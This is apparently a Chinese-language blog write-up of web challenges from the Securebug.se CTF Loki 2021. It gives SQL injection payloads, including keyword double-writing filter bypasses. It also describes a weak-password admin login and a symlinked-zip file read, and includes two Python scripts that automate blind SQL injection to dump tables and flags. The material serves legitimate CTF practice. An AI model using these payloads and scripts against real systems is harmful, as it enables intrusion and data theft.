---
title: Securebug.se CTF Loki 2021
date: 2021-07-22 20:56:44
updated: 2021-07-22 20:56:44
categories: Write up
---

Securebug.se CTF Loki 2021 —web WriteUp

题目比较简单

<!--more-->

## **Simple Login**

查看源码

<img src="http://img.npfs06.top/20210722164243.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />



## **Doodle Search**

查看源码发现注释 
```
<!-- <a href="?source">sauce</a> -->
```
访问:  https://ch1.sbug.se/?source

```php
 <?php
    if (isset($_GET['q'])) {
        
        $query = "SELECT * FROM websites WHERE title LIKE '%" . $_GET['q'].  "%' OR description LIKE '%" . $_GET['q'] .  "%' OR link LIKE '%" . $_GET['q'] . "%';";
        $result = $conn->query($query);

        echo  "<h2>search '". htmlspecialchars($_GET['q']) . "' : results " . $result->num_rows . "</h2>";
    ?>
    <?php
        if (isset($result) && $result->num_rows > 0) {
            echo "<hr/>";
            echo "<br/>";

            // output data of each row
            while($row = $result->fetch_assoc()) {
                echo "<div>";
                echo "<a href='" . $row['link'] . "'><h2>" . htmlspecialchars($row['title']) . "</h2></a>";
                echo "<p>" . htmlspecialchars($row['link']) . "</p>";
                echo "<h5 style='color: #777;'>" . htmlspecialchars($row['description']) . "</h5></div>";
                echo "<hr/>";
            }
        }
    ?>
```

payload:

> ' union select 1,2,password from secrets#

<img src="http://img.npfs06.top/20210722163338.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />





## Yummy Cookie

页面提示

> Who let the robots out?

访问： https://ch27.sbug.se/robots.txt

得到提示

```
User-agent: *
Disallow: 007469e470d.php
```

访问： https://ch27.sbug.se/007469e470d.php

根据提示修改http头即可

<img src="http://img.npfs06.top/20210722164822.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />



##  Inception

查看源码发现注释

```
<!-- /?src -->
```



访问： https://ch24.sbug.se/?src

得到提示

> preg_replace("/select|union|from|where/i", "", @$_GET["fname"]);

双写绕过即可

```
1' uniounionn selecselectt  group_concat(table_name),2,3 frofromm information_schema.tables whwhereere table_schema=database()#
```

<img src="http://img.npfs06.top/20210722165827.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />



```
1' uniounionn selecselectt  group_concat(column_name),2,3 frofromm information_schema.columns whwhereere table_name="inception_users"#
```

<img src="http://img.npfs06.top/20210722170006.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />



```
1' ununionion selselectect group_concat(passwd),2,3 frfromom inception_users#
```

<img src="http://img.npfs06.top/20210722170252.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />



##  Unzipper

目录扫描，存在后台地址： https://ch26.sbug.se/admin.php

弱密码  admin/admin  登入

根据提示，需要上传zip文件，想到软连接。[SWPU2019]Web3中有过类似的考点

不过这里的flag路径要写 `/flag`，不是`/etc/flag`s



<img src="http://img.npfs06.top/20210722191145.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />



<img src="http://img.npfs06.top/20210722191116.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />



## Ninja Blog



```python
import string
import requests

url = 'https://ch2.sbug.se/login.php'
s = string.digits + string.ascii_letters + string.punctuation
print(s)
payload = {
    'username' : '',
    'password' : 1
}
result = ''

username_template = "'admin'or/**/ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),{0},1))={1}#"
#username_template = "admin'or/**/ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='blog_v2'),{0},1))={1}#"
#username_template = "admin'or/**/ascii(substr((select username from  blog_v2 limit 2,1),{0},1))={1}#"
            
st = 0
for i in range(1,50):
    st = 0
    for c in s :
        asc = ord(c)
        payload['username'] = username_template.format(i,asc)
        response = requests.post(url, data=payload)
        print(response)
        if "You are in, but your role is not admin" in response.text: 
            result += c
            print('tables: ', result)
            st = 1
    if st == 0:
        break
print('tables: ', result)

##jony
```

<img src="http://img.npfs06.top/20210722203158.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />

<img src="http://img.npfs06.top/20210722203214.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />



## blacklist



```python
import requests
url = "https://ch23.sbug.se/?fname="
temp = {}
a = ""
for i in range(1,1000):
    low = 32
    high =128
    mid = (low+high)//2
    while (low<high):
        #payload = "admin'%26%26({}<ascii(substr((select(database())),{},1)))%23".format(mid, i)     		  
        #payload="admin'%26%26if((ascii(substr((select(concat(table_name))from(information_schema.tables)where(table_schema='test')),{},1))>{}),1,0)%23".format(i, mid)
        #payload = "admin'%26%26if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema='test')and(table_name='blacklist_users')),{},1))>{}),1,0)%23".format(i, mid)
        payload = "admin'%26%26if((ascii(substr((select(group_concat(flag))from(blacklist_users)),{},1))>{}),1,0)%23".format(i, mid)
        temp = {"id":payload}
        r = requests.get(url + payload)
        if "youtube" in r.text:
            low = mid+1
        else:
            high = mid
        mid =(low+high)//2
    if(mid ==32 or mid ==127):
        break
    a +=chr(mid)
    print(a)
print("password=",a)

```

